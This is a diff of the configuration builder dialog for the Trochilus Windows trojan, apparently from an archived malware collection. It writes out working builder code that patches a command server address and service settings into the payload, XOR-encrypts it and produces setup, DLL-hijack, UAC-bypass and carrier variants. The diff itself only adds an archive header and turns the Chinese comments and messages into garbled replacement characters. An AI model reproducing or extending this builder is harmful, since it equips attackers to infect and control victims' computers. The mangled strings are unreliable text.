@@ -1,5 +1,16 @@
+/*
+  name      Trochilus
+  type      trojan
+  cve       â€”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     â€”
+ */
 
-// Generate_binDlg.cpp : ÊµÏÖÎÄ¼þ
+// Generate_binDlg.cpp : Êµï¿½ï¿½ï¿½Ä¼ï¿½
 //
 
 #include "stdafx.h"
@@ -73,7 +84,7 @@ static BOOL FindAndSet(LPBYTE pBase, DWORD dwSize, DWORD dwFlag, LPBYTE pData, D
 	if (count != 1)
 	{
 		CString errorMsg;
-		errorMsg.Format(_T("¶¨Î»%XÌØÕ÷Ê§°Ü,·¢ÏÖÆ¥Åä¸öÊý %d"), dwFlag, count);
+		errorMsg.Format(_T("ï¿½ï¿½Î»%Xï¿½ï¿½ï¿½ï¿½Ê§ï¿½ï¿½,ï¿½ï¿½ï¿½ï¿½Æ¥ï¿½ï¿½ï¿½ï¿½ï¿½ %d"), dwFlag, count);
 		return FALSE;
 	}
 
@@ -93,7 +104,7 @@ static BOOL FindAndSet(LPBYTE pBase, DWORD dwSize, DWORD dwFlag, LPBYTE pData, D
 	return FALSE;
 }
 
-// CGenerate_binDlg ¶Ô»°¿ò
+// CGenerate_binDlg ï¿½Ô»ï¿½ï¿½ï¿½
 CGeneratorDlg::CGeneratorDlg(CWnd* pParent /*=NULL*/)
 	: CDialogEx(CGeneratorDlg::IDD, pParent)
 {
@@ -122,7 +133,7 @@ BEGIN_MESSAGE_MAP(CGeneratorDlg, CDialogEx)
 END_MESSAGE_MAP()
 
 
-// CGenerate_binDlg ÏûÏ¢´¦Àí³ÌÐò
+// CGenerate_binDlg ï¿½ï¿½Ï¢ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 void CGeneratorDlg::InitDlgEdit()
 {
 	LoadGeneratorConfig(config);
@@ -143,7 +154,7 @@ void CGeneratorDlg::InitDlgEdit()
 // 		m_SetupType.EnableWindow(FALSE);
 // 	}
 
-//	m_DefaultComm.AddString(_T("×Ô¶¯¼ì²â"));;
+//	m_DefaultComm.AddString(_T("ï¿½Ô¶ï¿½ï¿½ï¿½ï¿½"));;
 
 	m_DefaultComm.InsertString(0,_T("HTTP"));
 	m_DefaultComm.SetItemData(0,COMMNAME_HTTP);
@@ -162,8 +173,8 @@ void CGeneratorDlg::InitDlgEdit()
 	m_DefaultComm.SetCurSel(config.commType);
 	OnCbnSelendokComboComm();
 
-// 	m_SetupType.InsertString(0, _T("¸ù¾ÝÖ¸¶¨µÄÄ¿Â¼Î»ÖÃ°²×°"));
-// 	m_SetupType.InsertString(0, _T("»ìÏýËæ»ú°²×°"));
+// 	m_SetupType.InsertString(0, _T("ï¿½ï¿½ï¿½ï¿½Ö¸ï¿½ï¿½ï¿½ï¿½Ä¿Â¼Î»ï¿½Ã°ï¿½×°"));
+// 	m_SetupType.InsertString(0, _T("ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½×°"));
 // 	m_SetupType.SetCurSel(config.setupType);
 
 	SetDlgItemInt(IDC_EDIT_TRY_INTERVALM, config.connectTryIntervalM);
@@ -195,45 +206,45 @@ void CGeneratorDlg::InitDlgEdit()
 // 	}
 	
 
-	//Ä¿Ç°ÉÐÎ´¿ª·ÅµÄÅäÖÃ
-	m_ConnectType.InsertString(0,L"ÓòÃû½âÎö");
-	m_ConnectType.InsertString(0,L"HTTPµØÖ·½âÎö");
-	m_ConnectType.InsertString(0,L"¹Ì¶¨IP»òURLµØÖ·");
+	//Ä¿Ç°ï¿½ï¿½Î´ï¿½ï¿½ï¿½Åµï¿½ï¿½ï¿½ï¿½ï¿½
+	m_ConnectType.InsertString(0,L"ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½");
+	m_ConnectType.InsertString(0,L"HTTPï¿½ï¿½Ö·ï¿½ï¿½ï¿½ï¿½");
+	m_ConnectType.InsertString(0,L"ï¿½Ì¶ï¿½IPï¿½ï¿½URLï¿½ï¿½Ö·");
 	m_ConnectType.SetCurSel(0);
 
-// 	m_ProxyType.InsertString(0,L"SOCK5´úÀí");
-// 	m_ProxyType.InsertString(0,L"HTTP´úÀí");
-// 	m_ProxyType.InsertString(0,L"ä¯ÀÀÆ÷Ä¬ÈÏ´úÀí£¨´©Í¸ISA£©");
-// 	m_ProxyType.InsertString(0,L"²»Ê¹ÓÃ´úÀí");
+// 	m_ProxyType.InsertString(0,L"SOCK5ï¿½ï¿½ï¿½ï¿½");
+// 	m_ProxyType.InsertString(0,L"HTTPï¿½ï¿½ï¿½ï¿½");
+// 	m_ProxyType.InsertString(0,L"ï¿½ï¿½ï¿½ï¿½ï¿½Ä¬ï¿½Ï´ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Í¸ISAï¿½ï¿½");
+// 	m_ProxyType.InsertString(0,L"ï¿½ï¿½Ê¹ï¿½Ã´ï¿½ï¿½ï¿½");
 // 	m_ProxyType.SetCurSel(0);
 }
 BOOL CGeneratorDlg::OnInitDialog()
 {
 	CDialogEx::OnInitDialog();
 
-	// ÉèÖÃ´Ë¶Ô»°¿òµÄÍ¼±ê¡£µ±Ó¦ÓÃ³ÌÐòÖ÷´°¿Ú²»ÊÇ¶Ô»°¿òÊ±£¬¿ò¼Ü½«×Ô¶¯
-	//  Ö´ÐÐ´Ë²Ù×÷
-	SetIcon(m_hIcon, TRUE);			// ÉèÖÃ´óÍ¼±ê
-	SetIcon(m_hIcon, FALSE);		// ÉèÖÃÐ¡Í¼±ê
+	// ï¿½ï¿½ï¿½Ã´Ë¶Ô»ï¿½ï¿½ï¿½ï¿½Í¼ï¿½ê¡£ï¿½ï¿½Ó¦ï¿½Ã³ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ú²ï¿½ï¿½Ç¶Ô»ï¿½ï¿½ï¿½Ê±ï¿½ï¿½ï¿½ï¿½Ü½ï¿½ï¿½Ô¶ï¿½
+	//  Ö´ï¿½Ð´Ë²ï¿½ï¿½ï¿½
+	SetIcon(m_hIcon, TRUE);			// ï¿½ï¿½ï¿½Ã´ï¿½Í¼ï¿½ï¿½
+	SetIcon(m_hIcon, FALSE);		// ï¿½ï¿½ï¿½ï¿½Ð¡Í¼ï¿½ï¿½
 
-	// TODO: ÔÚ´ËÌí¼Ó¶îÍâµÄ³õÊ¼»¯´úÂë
+	// TODO: ï¿½Ú´ï¿½ï¿½ï¿½ï¿½Ó¶ï¿½ï¿½ï¿½Ä³ï¿½Ê¼ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 	InitDlgEdit();
-	return TRUE;  // ³ý·Ç½«½¹µãÉèÖÃµ½¿Ø¼þ£¬·ñÔò·µ»Ø TRUE
+	return TRUE;  // ï¿½ï¿½ï¿½Ç½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ãµï¿½ï¿½Ø¼ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ò·µ»ï¿½ TRUE
 }
 
-// Èç¹ûÏò¶Ô»°¿òÌí¼Ó×îÐ¡»¯°´Å¥£¬ÔòÐèÒªÏÂÃæµÄ´úÂë
-//  À´»æÖÆ¸ÃÍ¼±ê¡£¶ÔÓÚÊ¹ÓÃÎÄµµ/ÊÓÍ¼Ä£ÐÍµÄ MFC Ó¦ÓÃ³ÌÐò£¬
-//  Õâ½«ÓÉ¿ò¼Ü×Ô¶¯Íê³É¡£
+// ï¿½ï¿½ï¿½ï¿½ï¿½Ô»ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ð¡ï¿½ï¿½ï¿½ï¿½Å¥ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Òªï¿½ï¿½ï¿½ï¿½Ä´ï¿½ï¿½ï¿½
+//  ï¿½ï¿½ï¿½ï¿½ï¿½Æ¸ï¿½Í¼ï¿½ê¡£ï¿½ï¿½ï¿½ï¿½Ê¹ï¿½ï¿½ï¿½Äµï¿½/ï¿½ï¿½Í¼Ä£ï¿½Íµï¿½ MFC Ó¦ï¿½Ã³ï¿½ï¿½ï¿½
+//  ï¿½â½«ï¿½É¿ï¿½ï¿½ï¿½Ô¶ï¿½ï¿½ï¿½É¡ï¿½
 
 void CGeneratorDlg::OnPaint()
 {
 	if (IsIconic())
 	{
-		CPaintDC dc(this); // ÓÃÓÚ»æÖÆµÄÉè±¸ÉÏÏÂÎÄ
+		CPaintDC dc(this); // ï¿½ï¿½ï¿½Ú»ï¿½ï¿½Æµï¿½ï¿½è±¸ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 
 		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);
 
-		// Ê¹Í¼±êÔÚ¹¤×÷Çø¾ØÐÎÖÐ¾ÓÖÐ
+		// Ê¹Í¼ï¿½ï¿½ï¿½Ú¹ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ð¾ï¿½ï¿½ï¿½
 		int cxIcon = GetSystemMetrics(SM_CXICON);
 		int cyIcon = GetSystemMetrics(SM_CYICON);
 		CRect rect;
@@ -241,7 +252,7 @@ void CGeneratorDlg::OnPaint()
 		int x = (rect.Width() - cxIcon + 1) / 2;
 		int y = (rect.Height() - cyIcon + 1) / 2;
 
-		// »æÖÆÍ¼±ê
+		// ï¿½ï¿½ï¿½ï¿½Í¼ï¿½ï¿½
 		dc.DrawIcon(x, y, m_hIcon);
 	}
 	else
@@ -250,8 +261,8 @@ void CGeneratorDlg::OnPaint()
 	}
 }
 
-//µ±ÓÃ»§ÍÏ¶¯×îÐ¡»¯´°¿ÚÊ±ÏµÍ³µ÷ÓÃ´Ëº¯ÊýÈ¡µÃ¹â±ê
-//ÏÔÊ¾¡£
+//ï¿½ï¿½ï¿½Ã»ï¿½ï¿½Ï¶ï¿½ï¿½ï¿½Ð¡ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ê±ÏµÍ³ï¿½ï¿½ï¿½Ã´Ëºï¿½ï¿½ï¿½È¡ï¿½Ã¹ï¿½ï¿½
+//ï¿½ï¿½Ê¾ï¿½ï¿½
 HCURSOR CGeneratorDlg::OnQueryDragIcon()
 {
 	return static_cast<HCURSOR>(m_hIcon);
@@ -392,7 +403,7 @@ BOOL XorEncryptFile(LPCTSTR lpszFilePath, UINT encryptSize,int key1 = 3 ,int key
 	if (dwOutFileSize != nFileSize)
 		goto END;
 	
-	//¼ì²éPEÊÇ²»ÊÇÒÑ¾­¼ÓÃÜ¹ý
+	//ï¿½ï¿½ï¿½PEï¿½Ç²ï¿½ï¿½ï¿½ï¿½Ñ¾ï¿½ï¿½ï¿½ï¿½Ü¹ï¿½
 
 	char* head = "EW";
 
@@ -467,7 +478,7 @@ BOOL WriteSetup(CONNECT_INFO& config,SERVICE_INFO& service,CString& strError)
 	HANDLE hFile = CreateFile(strTempServant,GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
 	if (hFile == INVALID_HANDLE_VALUE)
 	{
-		strError = _T("´ò¿ªÎÄ¼þÊ§°Ü");
+		strError = _T("ï¿½ï¿½ï¿½Ä¼ï¿½Ê§ï¿½ï¿½");
 		return FALSE;
 	}
 	
@@ -475,7 +486,7 @@ BOOL WriteSetup(CONNECT_INFO& config,SERVICE_INFO& service,CString& strError)
 	LPBYTE lpBase = new BYTE[nFileSize];
 	if (!lpBase)
 	{
-		strError = _T("ÉêÇëÄÚ´æÊ§°Ü£¡");
+		strError = _T("ï¿½ï¿½ï¿½ï¿½ï¿½Ú´ï¿½Ê§ï¿½Ü£ï¿½");
 		return FALSE;
 	}
 
@@ -483,19 +494,19 @@ BOOL WriteSetup(CONNECT_INFO& config,SERVICE_INFO& service,CString& strError)
 	{
 		delete lpBase;
 		CloseHandle(hFile);
-		strError = _T("¶ÁÎÄ¼þÊ§°Ü");
+		strError = _T("ï¿½ï¿½ï¿½Ä¼ï¿½Ê§ï¿½ï¿½");
 		return FALSE;
 	}
 
 	CloseHandle(hFile);
 
-	//Ð´ÈëÅäÖÃÐÅÏ¢
+	//Ð´ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ï¢
 	
 	if(!FindAndSet(lpBase,nFileSize,CONNECT_FLAG,(LPBYTE)&config,sizeof(CONNECT_INFO)))
 	{
 		delete lpBase;
 		CloseHandle(hFile);
-		strError = _T("¶¨Î»Ê§°Ü£¡");
+		strError = _T("ï¿½ï¿½Î»Ê§ï¿½Ü£ï¿½");
 		return FALSE;
 	}
 
@@ -503,7 +514,7 @@ BOOL WriteSetup(CONNECT_INFO& config,SERVICE_INFO& service,CString& strError)
 	{
 		delete lpBase;
 		CloseHandle(hFile);
-		strError = _T("¶¨Î»Ê§°Ü£¡");
+		strError = _T("ï¿½ï¿½Î»Ê§ï¿½Ü£ï¿½");
 		return FALSE;
 	}
 	
@@ -513,7 +524,7 @@ BOOL WriteSetup(CONNECT_INFO& config,SERVICE_INFO& service,CString& strError)
  	{
  		delete lpBase;
  		CloseHandle(hFile);
- 		strError = _T("Ð´ÈëÊ§°Ü£¡");
+ 		strError = _T("Ð´ï¿½ï¿½Ê§ï¿½Ü£ï¿½");
  		return FALSE;
  	}
 
@@ -526,28 +537,28 @@ BOOL WriteSetup(CONNECT_INFO& config,SERVICE_INFO& service,CString& strError)
 	int key1 = rand() % 255;
 	int key2 = rand() % 255;
 
-	//¼ÓÃÜÎÄ¼þ
+	//ï¿½ï¿½ï¿½ï¿½ï¿½Ä¼ï¿½
   	if (!XorEncryptFile(strShellPath, encryptSize,key1,key2))
   	{
 		CloseHandle(hFile);
-  		strError = _T("¼ÓÃÜÎÄ¼þÊ§°Ü£¡");
+  		strError = _T("ï¿½ï¿½ï¿½ï¿½ï¿½Ä¼ï¿½Ê§ï¿½Ü£ï¿½");
   		return FALSE;
   	}
 
 	encryptSize = GetFileSize(hFile,0);
 	CloseHandle(hFile);
 
-	//¼ÓÃÜÎÄ¼þ
+	//ï¿½ï¿½ï¿½ï¿½ï¿½Ä¼ï¿½
 	if (!XorEncryptFile(strDataServant,encryptSize ))
 	{
-		strError = _T("¼ÓÃÜÎÄ¼þÊ§°Ü£¡");
+		strError = _T("ï¿½ï¿½ï¿½ï¿½ï¿½Ä¼ï¿½Ê§ï¿½Ü£ï¿½");
 		return FALSE;
 	}
 
 	if(!ResourceToFile(strNSIFilePath,\
 		MAKEINTRESOURCE(IDR_RC_NSI),L"RC_NSI", szInstallPath,4096,key1,key2))
 	{
-		strError = _T("µ¼³ö×ÊÔ´Ê§°Ü!");
+		strError = _T("ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ô´Ê§ï¿½ï¿½!");
 		return FALSE;
 	}
 
@@ -585,10 +596,10 @@ BOOL WriteSetup(CONNECT_INFO& config,SERVICE_INFO& service,CString& strError)
 	outputFile.Format(_T("%s%s"), szPath, OUT_FILE);
 	hFile = CreateFile(outputFile,GENERIC_READ,FILE_SHARE_READ,NULL,\
 		OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
-	//Éú³É³É¹¦·µ»ØTRUE
+	//ï¿½ï¿½ï¿½É³É¹ï¿½ï¿½ï¿½ï¿½ï¿½TRUE
 	if (hFile == INVALID_HANDLE_VALUE)
 	{
-		strError.Format(_T("´´½¨[%s]Ê§°Ü"), outputFile);
+		strError.Format(_T("ï¿½ï¿½ï¿½ï¿½[%s]Ê§ï¿½ï¿½"), outputFile);
 		return FALSE;
 	}
 	
@@ -620,7 +631,7 @@ BOOL MakeCab(LPCTSTR lpsrcFilePath,LPCTSTR lpdesFilePath)
 
 	HANDLE hFile = CreateFile(lpdesFilePath,GENERIC_READ,FILE_SHARE_READ,NULL,\
 		OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
-	//Éú³É³É¹¦·µ»ØTRUE
+	//ï¿½ï¿½ï¿½É³É¹ï¿½ï¿½ï¿½ï¿½ï¿½TRUE
 	if (hFile == INVALID_HANDLE_VALUE)
 	{
 		return FALSE;
@@ -656,14 +667,14 @@ BOOL WriteHijack(CONNECT_INFO& config,SERVICE_INFO& service,CString& strError)
 	::DeleteFile(strTempServant);
 	if(!CopyFile(strServantPath,strTempServant,TRUE))
 	{
-		strError = _T("¿½±´ÎÄ¼þÊ§°Ü£¡");
+		strError = _T("ï¿½ï¿½ï¿½ï¿½ï¿½Ä¼ï¿½Ê§ï¿½Ü£ï¿½");
 		return FALSE;
 	}
 
 	HANDLE hFile = CreateFile(strTempServant,GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
 	if (hFile == INVALID_HANDLE_VALUE)
 	{
-		strError = _T("´ò¿ªÎÄ¼þÊ§°Ü");
+		strError = _T("ï¿½ï¿½ï¿½Ä¼ï¿½Ê§ï¿½ï¿½");
 		return FALSE;
 	}
 
@@ -671,7 +682,7 @@ BOOL WriteHijack(CONNECT_INFO& config,SERVICE_INFO& service,CString& strError)
 	LPBYTE lpBase = new BYTE[nFileSize];
 	if (!lpBase)
 	{
-		strError = _T("ÉêÇëÄÚ´æÊ§°Ü£¡");
+		strError = _T("ï¿½ï¿½ï¿½ï¿½ï¿½Ú´ï¿½Ê§ï¿½Ü£ï¿½");
 		return FALSE;
 	}
 
@@ -679,17 +690,17 @@ BOOL WriteHijack(CONNECT_INFO& config,SERVICE_INFO& service,CString& strError)
 	{
 		delete lpBase;
 		CloseHandle(hFile);
-		strError = _T("¶ÁÎÄ¼þÊ§°Ü");
+		strError = _T("ï¿½ï¿½ï¿½Ä¼ï¿½Ê§ï¿½ï¿½");
 		return FALSE;
 	}
 
-	//Ð´ÈëÅäÖÃÐÅÏ¢
+	//Ð´ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ï¢
 
 	if(!FindAndSet(lpBase,nFileSize,CONNECT_FLAG,(LPBYTE)&config,sizeof(CONNECT_INFO),TRUE,CONNECT_CONFIG_FACTOR1,CONNECT_CONFIG_FACTOR2))
 	{
 		delete lpBase;
 		CloseHandle(hFile);
-		strError = _T("¶¨Î»Ê§°Ü£¡");
+		strError = _T("ï¿½ï¿½Î»Ê§ï¿½Ü£ï¿½");
 		return FALSE;
 	}
 
@@ -697,7 +708,7 @@ BOOL WriteHijack(CONNECT_INFO& config,SERVICE_INFO& service,CString& strError)
 	{
 		delete lpBase;
 		CloseHandle(hFile);
-		strError = _T("¶¨Î»Ê§°Ü£¡");
+		strError = _T("ï¿½ï¿½Î»Ê§ï¿½Ü£ï¿½");
 		return FALSE;
 	}
 
@@ -706,7 +717,7 @@ BOOL WriteHijack(CONNECT_INFO& config,SERVICE_INFO& service,CString& strError)
 	{
 		delete lpBase;
 		CloseHandle(hFile);
-		strError = _T("Ð´ÈëÊ§°Ü£¡");
+		strError = _T("Ð´ï¿½ï¿½Ê§ï¿½Ü£ï¿½");
 		return FALSE;
 	}
 
@@ -747,21 +758,21 @@ BOOL WriteBypassUAC(CONNECT_INFO& config,SERVICE_INFO& service,CString& strError
 
 	if(!CreateDirectory(szPath+_T("\\")+BINGO_PATH,NULL) && ::GetLastError() != ERROR_ALREADY_EXISTS)
 	{
-		strError = _T("´´½¨ÁÙÊ±Ä¿Â¼Ê§°Ü£¡");
+		strError = _T("ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ê±Ä¿Â¼Ê§ï¿½Ü£ï¿½");
 		return FALSE;
 	}
 
 	::DeleteFile(strSavePath +_T("\\")+ BUG_DLL);
 	if(!CopyFile(szPath+SERVANT_FILE, strSavePath +_T("\\")+ SERVANT_FILE, FALSE))
 	{
-		strError = _T("¿½±´ÎÄ¼þÊ§°Ü£¡");
+		strError = _T("ï¿½ï¿½ï¿½ï¿½ï¿½Ä¼ï¿½Ê§ï¿½Ü£ï¿½");
 		return FALSE;
 	}
 
 	HANDLE hFile = CreateFile(strSavePath +_T("\\")+ SERVANT_FILE,GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
 	if (hFile == INVALID_HANDLE_VALUE)
 	{
-		strError = _T("´ò¿ªÎÄ¼þÊ§°Ü");
+		strError = _T("ï¿½ï¿½ï¿½Ä¼ï¿½Ê§ï¿½ï¿½");
 		return FALSE;
 	}
 
@@ -769,7 +780,7 @@ BOOL WriteBypassUAC(CONNECT_INFO& config,SERVICE_INFO& service,CString& strError
 	LPBYTE lpBase = new BYTE[nFileSize];
 	if (!lpBase)
 	{
-		strError = _T("ÉêÇëÄÚ´æÊ§°Ü£¡");
+		strError = _T("ï¿½ï¿½ï¿½ï¿½ï¿½Ú´ï¿½Ê§ï¿½Ü£ï¿½");
 		return FALSE;
 	}
 
@@ -777,17 +788,17 @@ BOOL WriteBypassUAC(CONNECT_INFO& config,SERVICE_INFO& service,CString& strError
 	{
 		delete lpBase;
 		CloseHandle(hFile);
-		strError = _T("¶ÁÎÄ¼þÊ§°Ü");
+		strError = _T("ï¿½ï¿½ï¿½Ä¼ï¿½Ê§ï¿½ï¿½");
 		return FALSE;
 	}
 
-	//Ð´ÈëÅäÖÃÐÅÏ¢
+	//Ð´ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ï¢
 
 	if(!FindAndSet(lpBase,nFileSize,CONNECT_FLAG,(LPBYTE)&config,sizeof(CONNECT_INFO),TRUE,CONNECT_CONFIG_FACTOR1,CONNECT_CONFIG_FACTOR2))
 	{
 		delete lpBase;
 		CloseHandle(hFile);
-		strError = _T("¶¨Î»Ê§°Ü£¡");
+		strError = _T("ï¿½ï¿½Î»Ê§ï¿½Ü£ï¿½");
 		return FALSE;
 	}
 
@@ -795,7 +806,7 @@ BOOL WriteBypassUAC(CONNECT_INFO& config,SERVICE_INFO& service,CString& strError
 	{
 		delete lpBase;
 		CloseHandle(hFile);
-		strError = _T("¶¨Î»Ê§°Ü£¡");
+		strError = _T("ï¿½ï¿½Î»Ê§ï¿½Ü£ï¿½");
 		return FALSE;
 	}
 
@@ -804,7 +815,7 @@ BOOL WriteBypassUAC(CONNECT_INFO& config,SERVICE_INFO& service,CString& strError
 	{
 		delete lpBase;
 		CloseHandle(hFile);
-		strError = _T("Ð´ÈëÊ§°Ü£¡");
+		strError = _T("Ð´ï¿½ï¿½Ê§ï¿½Ü£ï¿½");
 		return FALSE;
 	}
 
@@ -816,7 +827,7 @@ BOOL WriteBypassUAC(CONNECT_INFO& config,SERVICE_INFO& service,CString& strError
 	if(!ResourceToFile(strNSIFilePath,\
 		MAKEINTRESOURCE(IDR_RC_NSI3),L"RC_NSI", szInstallPath,4096/*nFileSize*/))
 	{
-		strError = _T("µ¼³ö×ÊÔ´Ê§°Ü!");
+		strError = _T("ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ô´Ê§ï¿½ï¿½!");
 		return FALSE;
 	}
 	CString strFullCmd;
@@ -864,7 +875,7 @@ BOOL WriteCarrier(CONNECT_INFO& config,SERVICE_INFO& service,CString& errorMsg)
 		hFile = ::CreateFile(targetFilepath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 		if (INVALID_HANDLE_VALUE == hFile)
 		{
-			errorMsg.Format(_T("´ò¿ªÎÄ¼þ%sÊ§°Ü. E%u"), targetFilepath, ::GetLastError());
+			errorMsg.Format(_T("ï¿½ï¿½ï¿½Ä¼ï¿½%sÊ§ï¿½ï¿½. E%u"), targetFilepath, ::GetLastError());
 			break;
 		}
 
@@ -873,26 +884,26 @@ BOOL WriteCarrier(CONNECT_INFO& config,SERVICE_INFO& service,CString& errorMsg)
 		hMapping = ::CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, 0, NULL);
 		if (NULL == hMapping)
 		{
-			errorMsg.Format(_T("´ò¿ªÎÄ¼þÓ³Éä%sÊ§°Ü. E%u"), targetFilepath, ::GetLastError());
+			errorMsg.Format(_T("ï¿½ï¿½ï¿½Ä¼ï¿½Ó³ï¿½ï¿½%sÊ§ï¿½ï¿½. E%u"), targetFilepath, ::GetLastError());
 			break;
 		}
 
 		lpBase = (LPBYTE) ::MapViewOfFile(hMapping, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, 0);
 		if (NULL == lpBase)
 		{
-			errorMsg.Format(_T("Ó³ÉäÎÄ¼þÄÚ´æ%sÊ§°Ü. E%u"), targetFilepath, ::GetLastError());
+			errorMsg.Format(_T("Ó³ï¿½ï¿½ï¿½Ä¼ï¿½ï¿½Ú´ï¿½%sÊ§ï¿½ï¿½. E%u"), targetFilepath, ::GetLastError());
 			break;
 		}
 
 		if (! FindAndSet(lpBase, dwFileSize, SERVICE_FLAG, (LPBYTE)&service, sizeof(service)))
 		{
-			errorMsg.Format(_T("Ìæ»»serviceÊý¾ÝÊ§°Ü%s. E%u"), targetFilepath, ::GetLastError());
+			errorMsg.Format(_T("ï¿½æ»»serviceï¿½ï¿½ï¿½ï¿½Ê§ï¿½ï¿½%s. E%u"), targetFilepath, ::GetLastError());
 			break;
 		}
 
 		if (! FindAndSet(lpBase, dwFileSize, CONNECT_FLAG, (LPBYTE)&config, sizeof(config)))
 		{
-			errorMsg.Format(_T("Ìæ»»configÊý¾ÝÊ§°Ü%s. E%u"), targetFilepath, ::GetLastError());
+			errorMsg.Format(_T("ï¿½æ»»configï¿½ï¿½ï¿½ï¿½Ê§ï¿½ï¿½%s. E%u"), targetFilepath, ::GetLastError());
 			break;
 		}
 
@@ -914,75 +925,75 @@ void CGeneratorDlg::OnBnClickedButtonBingo()
 
 	UpdateWindow();
 
-	//µÃµ½Á¬½ÓµØÖ·
+	//ï¿½Ãµï¿½ï¿½ï¿½ï¿½Óµï¿½Ö·
 	GetDlgItemTextA(m_hWnd,IDC_EDIT_CONADDR, Config_Info.szAddr,sizeof(Config_Info.szAddr));
 	generateConfig.serverIP = CString(Config_Info.szAddr);
 
-// 	//µÃµ½°²×°Ä¿Â¼
+// 	//ï¿½Ãµï¿½ï¿½ï¿½×°Ä¿Â¼
 // 	GetDlgItemTextW(IDC_EDIT_INSTALLPATH,Service_Info.szInstalPath,sizeof(Service_Info.szInstalPath)/sizeof(TCHAR));
 // 	generateConfig.serviceInstallpath = Service_Info.szInstalPath;
 	lstrcpy(Service_Info.szInstalPath,config.serviceInstallpath);
 
-// 	//µÃµ½·þÎñÃû
+// 	//ï¿½Ãµï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 // 	GetDlgItemTextA(m_hWnd,IDC_EDIT_SERVICENAME, Service_Info.szServiceName,sizeof(Service_Info.szServiceName));
 // 	generateConfig.serviceName = CString(Service_Info.szServiceName);
 	lstrcpyA(Service_Info.szServiceName,CStringA(config.serviceName).GetBuffer());
 
-// 	//µÃµ½·þÎñDisplayName
+// 	//ï¿½Ãµï¿½ï¿½ï¿½ï¿½ï¿½DisplayName
 // 	GetDlgItemTextA(m_hWnd,IDC_EDIT_DISPLAYNAME,Service_Info.szDisplayName,sizeof(Service_Info.szDisplayName));
 // 	generateConfig.serviceDisplayName = CString(Service_Info.szDisplayName);
 	lstrcpyA(Service_Info.szDisplayName,CStringA(config.serviceDisplayName).GetBuffer());
 
-// 	//µÃµ½·þÎñÃèÊö
+// 	//ï¿½Ãµï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 // 	GetDlgItemTextA(m_hWnd,IDC_EDIT_SERVICEDEC,Service_Info.szServiceDecript,sizeof(Service_Info.szServiceDecript));
 // 	generateConfig.serviceDescription = CString(Service_Info.szServiceDecript);
 	lstrcpyA(Service_Info.szServiceDecript,CStringA(config.serviceDescription).GetBuffer());
 
-// 	//µÃµ½´úÀíµØÖ·
+// 	//ï¿½Ãµï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ö·
 // 	GetDlgItemTextA(m_hWnd,IDC_EDIT_PROXYADDR,Config_Info.szProxyAddr,sizeof(Config_Info.szProxyAddr));
 
-// 	//µÃµ½´úÀíÓÃ»§Ãû
+// 	//ï¿½Ãµï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ã»ï¿½ï¿½ï¿½
 // 	GetDlgItemTextA(m_hWnd,IDC_EDIT_PROXYUSER,Config_Info.szProxyUsername,sizeof(Config_Info.szProxyUsername));
 
-// 	//µÃµ½´úÀíÓÃ»§ÃÜÂë
+// 	//ï¿½Ãµï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ã»ï¿½ï¿½ï¿½ï¿½ï¿½
 // 	GetDlgItemTextA(m_hWnd,IDC_EDIT_PROXYPASS,Config_Info.szProxyPassword,sizeof(Config_Info.szProxyPassword));
 
-	//µÃµ½×éÃû
+	//ï¿½Ãµï¿½ï¿½ï¿½ï¿½ï¿½
 	GetDlgItemTextA(m_hWnd,IDC_EDIT_GROUP,Config_Info.szGroups,sizeof(Config_Info.szProxyPassword));
 
 
-	//µÃµ½Í¨ÐÅ·½Ê½
+	//ï¿½Ãµï¿½Í¨ï¿½Å·ï¿½Ê½
 	int nSel = m_DefaultComm.GetCurSel();
 	Config_Info.nDefaultCommType = m_DefaultComm.GetItemData(nSel);
 	generateConfig.commType = m_DefaultComm.GetCurSel();
 
-	//µÃµ½³¢ÊÔÁ¬½Ó¼ä¸ô
+	//ï¿½Ãµï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ó¼ï¿½ï¿½
 	Config_Info.nTryConnectIntervalM = GetDlgItemInt(IDC_EDIT_TRY_INTERVALM);
